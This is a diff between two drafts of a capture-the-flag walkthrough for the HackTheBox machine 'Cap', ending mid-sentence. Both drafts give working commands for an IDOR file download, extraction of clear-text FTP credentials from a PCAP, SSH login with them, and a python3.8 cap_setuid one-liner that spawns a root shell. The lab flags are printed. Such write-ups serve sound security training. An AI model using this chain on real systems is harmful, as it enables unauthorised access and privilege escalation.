@@ -1,86 +1,90 @@
-Welcome, everyone. Today we’ll walk through the HackTheBox machine **Cap**, rated Easy, and see how a combination of an IDOR flaw, clear‑text FTP credentials, and a mis‑configured Linux capability leads from initial foothold to root.
+Hello everyone, welcome to this quick deep‑dive into the HackTheBox machine **Cap**, rated Easy. I’ll walk you through the reconnaissance, the initial foothold, the privilege‑escalation path, and the key takeaway for anyone tasked with securing similar environments.
 
 **Reconnaissance**  
-We start with a full‑service scan:  
+We start with a standard service scan:  
 
 ```bash
 nmap -sC -sV 10.129.19.233
 ```  
 
 The scan returns three open ports:  
-- 21/tcp running vsftpd 3.0.3,  
-- 22/tcp running OpenSSH 8.2p1 on Ubuntu,  
-- 80/tcp serving a Gunicorn‑powered “Security Dashboard” web app.  
 
-Anonymous FTP login is attempted but fails, so we turn our attention to the web interface. The dashboard exposes three endpoints: `/capture`, `/ip`, and `/netstat`. Visiting `/capture` always issues a 302 redirect to `/data/1`. Curiosity leads us to manually request lower numeric IDs:
+- **21/tcp** – vsftpd 3.0.3  
+- **22/tcp** – OpenSSH 8.2p1 on Ubuntu 4ubuntu0.2  
+- **80/tcp** – Gunicorn serving a web app called “Security Dashboard”
+
+Anonymous FTP login is attempted but fails, so we turn our attention to the HTTP service on port 80. Browsing the dashboard reveals three interesting endpoints:  
+
+- `/capture` – always redirects to `/data/1` and offers a five‑second PCAP plus analysis  
+- `/ip` – runs `ifconfig` and returns the output  
+- `/netstat` – shows active network connections  
+
+A quick curl confirms the redirect:
 
 ```bash
-curl -s http://10.129.19.233/data/0
-```  
+curl -s http://10.129.19.233/capture -v   # → 302 to /data/1
+```
 
-We receive a page with a download button pointing to `/download/0`. This is a classic Insecure Direct Object Reference (IDOR): the application trusts the user‑supplied ID without authorization checks, letting us access other users’ snapshots.
+**Finding the IDOR**  
+Notice that `/capture` hard‑codes the redirect to `/data/1`. By manually requesting lower numeric IDs we uncover an Insecure Direct Object Reference:
 
-**Exploitation – IDOR to Credentials**  
-We download the PCAP file:
+```bash
+curl -s http://10.129.19.233/data/0   # returns a page with a Download button pointing to /download/0
+```
+
+Thus `/download/0` serves a previously stored PCAP file that belongs to another user/session.
+
+**Exploiting the IDOR**  
+We grab the PCAP and inspect it for clear‑text credentials:
 
 ```bash
 curl -s http://10.129.19.233/download/0 -o capture.pcap
-```  
-
-Then we inspect it for FTP traffic using tshark:
-
-```bash
 tshark -r capture.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg
-```  
+```
 
-The output shows the FTP session in plaintext:
+The output shows:
 
 ```
 USER    nathan
 PASS    Buck3tH4TF0RM3!
-```  
+```
 
-Because the machine still runs an FTP service, we reuse these credentials for SSH:
+FTP transmits credentials in plaintext, and the PCAP captured exactly that. We reuse those credentials for SSH:
 
 ```bash
-ssh nathan@10.129.19.233
-# password: Buck3tH4TF0RM3!
-```  
+ssh nathan@10.129.19.233   # password: Buck3tH4TF0RM3!
+```
 
-We land as user **nathan** and grab the user flag: `2874475212d535da1ca01f207b3a6939`.
+We land as user **nathan** and retrieve the user flag: `2874475212d535da1ca01f207b3a6939`.
 
-**Privilege Escalation – Linux Capabilities**  
-Post‑exploitation enumeration begins with a capability search:
+**Privilege Escalation**  
+Now we enumerate Linux capabilities, a step often overlooked in basic sudo‑based checks:
 
 ```bash
 getcap -r / 2>/dev/null
-```  
+```
 
-The result highlights a powerful misconfiguration:
+The result highlights a misconfigured Python binary:
 
 ```
 /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
-```  
+```
 
-The `cap_setuid` flag allows the binary to change its own UID to any value, including 0 (root), without needing the SUID bit. We abuse it with a one‑liner:
+The `cap_setuid` capability lets a process change its own UID to zero without needing a SUID bit. We can abuse it directly:
 
 ```bash
 python3.8 -c 'import os; os.setuid(0); os.system("bash")'
-```  
+```
 
-Spawning a shell yields:
+Executing that spawns a root shell:
 
 ```
 uid=0(root) gid=1001(nathan) groups=1001(nathan)
-```  
+```
 
-Now we read the root flag: `006b90cfdd1f951eb31fe3278eb85847`.
+From there we read the root flag: `006b90cfdd1f951eb31fe3278eb85847`.
 
 **Key Takeaway**  
-Cap demonstrates three recurring themes for security professionals:  
+This machine demonstrates two classic, yet frequently missed, attack vectors:
 
-1. **Test for IDOR on sequential numeric identifiers** – low IDs like 0, 1, 2 often leak sensitive files when access controls are missing.  
-2. **Never trust clear‑text protocols** – FTP credentials are trivially extracted from PCAPs; prefer TLS‑protected alternatives and enforce encryption everywhere.  
-3. **Always enumerate Linux capabilities** – `getcap -r /` can reveal exploitable bits such as `cap_setuid` on interpreters, granting instant root via a simple `os.setuid(0)` call.  
-
-Keep these checks in your recon and post‑
+1. **IDOR on predictable numeric identifiers** – always test low‑value IDs (0, 1, 2) on endpoints like `/data/` or `/download/`;
